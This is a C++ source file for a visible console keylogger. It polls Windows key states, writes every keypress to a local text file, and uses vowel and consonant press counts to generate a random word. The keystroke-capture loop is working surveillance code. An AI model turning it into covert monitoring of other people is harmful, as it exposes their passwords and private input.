#include <Windows.h>
#include <iostream>
#include <string>
#include <ctime>
#include "Key.h"

using namespace std;

Key::Key()
{
	//open up the files 
	loggedFile.open("loggedFile.txt", ios_base::app);
	vowFile.open("vowFile.txt", ios_base::app);
	consFile.open("consFile.txt", ios_base::app);

	if (loggedFile.fail())
	{
		cerr << "Error opening file!" << endl;
		cin.get();
		exit(1);
	}

	vTop = cTop = -1;
}

Key::~Key()
{
	//whitespace before closing files
	vowFile << "[F12]" << endl;
	consFile << "[F12]" << endl;

	//exit the files when done
	loggedFile.close();
	vowFile.close();
	consFile.close();
}

void Key::setLetters()
{
	a = 0, z = 0;

	for (i = 65; i < 91; i++)
	{
		if (i == 65 || i == 69 || i == 73 || i == 79 || i == 85)
		{
			vowels[i] = 0; //initiate vowel map to 0
		}
		else
		{
			consonants[i] = 0; //initiate cons map to 0
		}
	}
}

void Key::Keylogger()
{
	cout << endl;
	cout << "Running..." << endl;

	bool brk = false;
	bool brkPause = false;

	//loop until txt file is full or when user wants to break
	while (!loggedFile.eof() && brk == false)
	{
		i = 8; //ASCII table initial value: backspace

		while (i <= 255 && brk == false)
		{
			//1000 0000 0000 0001 translated to -32,769 for signed values
			//-32,769 + 2(number of bits set) = -32,767
			//-32767 == 1 key pressed
			if (GetAsyncKeyState(i) == -32767)
			{
				if (brkPause == false)
				{
					//switch to determine with key pressed
					switch (i)
					{
					case VK_SHIFT:
						loggedFile << "[SHT]" << endl;
						break;
					case VK_LBUTTON:
						loggedFile << "[LB]" << endl;
						break;
					case VK_RBUTTON:
						loggedFile << "[RB]" << endl;
						break;
					case VK_DELETE:
						loggedFile << "[DEL]" << endl;
						break;
					case VK_BACK:
						loggedFile << "[BCK]" << endl;
						break;
					case VK_UP:
						loggedFile << "[UP]" << endl;
						break;
					case VK_DOWN:
						loggedFile << "[DN]" << endl;
						break;
					case VK_LEFT:
						loggedFile << "[LFT]" << endl;
						break;
					case VK_RIGHT:
						loggedFile << "[RFT]" << endl;
						break;
					case VK_CONTROL:
						loggedFile << "[CTL]" << endl;
						break;
					case VK_TAB:
						loggedFile << "[TAB]" << endl;
						break;
					case VK_CAPITAL:
						loggedFile << "[CAP]" << endl;
						break;
					case VK_RETURN:
						loggedFile << "[ENT]" << endl;
						break;
					case VK_CLEAR:
						loggedFile << "[CLR]" << endl;
						break;
					case VK_MENU:
						loggedFile << "[ALT]" << endl;
						break;
					case VK_SPACE:
						loggedFile << "[SPC]" << endl;
						break;
					case VK_INSERT:
						loggedFile << "[INS]" << endl;
						break;
					case VK_HOME:
						loggedFile << "[HOM]" << endl;
						break;
					case VK_PRIOR:
						loggedFile << "[PgU]" << endl;
						break;
					case VK_NEXT:
						loggedFile << "[PgD]" << endl;
						break;
					case VK_END:
						loggedFile << "[END]" << endl;
						break;
					case VK_F10:
						//enter the paused method
						//hide all keys pressed after F10
						//KeyloggerPaused();
						brkPause = !brkPause;

						if (brkPause == true)
							cout << "Paused!" << endl;

						break;
					case VK_F12:
						loggedFile << "[F12]" << endl;
						brk = true; //end method
						break;
					case VK_ESCAPE:
						loggedFile << "[ESC]" << endl;
						Terminate();
						break;
					default:
						loggedFile << i << endl;
						break;
					}

					//send key pressed to method when not paused
					recordLetters(i);
				}
				else
				{
					if (i == VK_F10)
					{
						brkPause = !brkPause;
						cout << "Resumed!" << endl;
					}
				}
			}

			i++; //go up a character in the ASCII table

		}
	}
}

void Key::recordLetters(char x)
{
	//check to see if key pressed == vowel
	if (x == 65 || x == 69 || x == 73 || x == 79 || x == 85)
	{
		vowFile << x << '=' << ++vowels[x] << endl; //increase # of times the vowel is pressed
	}
	//check to see if key pressed == consonant
	else if (x > 65 && x < 91)
	{
		consFile << x << '=' << ++consonants[x] << endl; //increase if consonant
	}
}

void Key::Sort()
{
	a = 0;

	while (a < sizeof(vowArr) / sizeof(*vowArr))
	{
		//set least pressed vowel so far
		temp = vowels.begin()->second;
		tempVow = vowels.begin()->first;

		//check for lesser pressed vowel
		for (it = vowels.begin(); it != vowels.end(); it++)
		{
			if (it->second < temp)
			{
				//reset if there's a lesser pressed vowel
				temp = it->second;
				tempVow = it->first;
			}
		}

		vowArr[++vTop] = tempVow; //stack the least pressed vowel
		vowels.erase(tempVow); //erase it from map

		a++;
	}

	a = 0;

	while (a < sizeof(consArr) / sizeof(*consArr))
	{
		//set least pressed consonant so far
		temp = consonants.begin()->second;
		tempCons = consonants.begin()->first;

		//check for lesser pressed consonant
		for (it = consonants.begin(); it != consonants.end(); it++)
		{
			if (it->second < temp)
			{
				//reset if there's a lesser pressed consonant
				temp = it->second;
				tempCons = it->first;
			}
		}

		consArr[++cTop] = tempCons; //stack the least pressed consonant
		consonants.erase(tempCons); //erase it from map

		a++;
	}

}

char Key::pickVow()
{
	return vowArr[vTop--];
}

char Key::pickCons()
{
	return consArr[cTop--];
}

string Key::Word()
{
	string word;

	//random time
	srand(time(0));

	word += pickCons();
	word += pickVow();

	for (a = 0; a < 4; a++)
	{
		int gen = rand() % 2;

		if (gen == 1)
			word += pickVow();
		else
			word += pickCons();
	}

	return word;
}

void Key::Terminate()
{
	//user calling to terminate program
	//close files
	loggedFile.close();
	vowFile.close();
	consFile.close();

	//exit program immediately
	exit(1);
}

void Key::showKeys()
{
	//close the file
	loggedFile.close();

	string text;

	//reopen at the beginning
	loggedFile.open("loggedFile.txt");
	

	//print everything on the text file
	while (loggedFile >> text)
	{
		cout << text << endl;
	}
}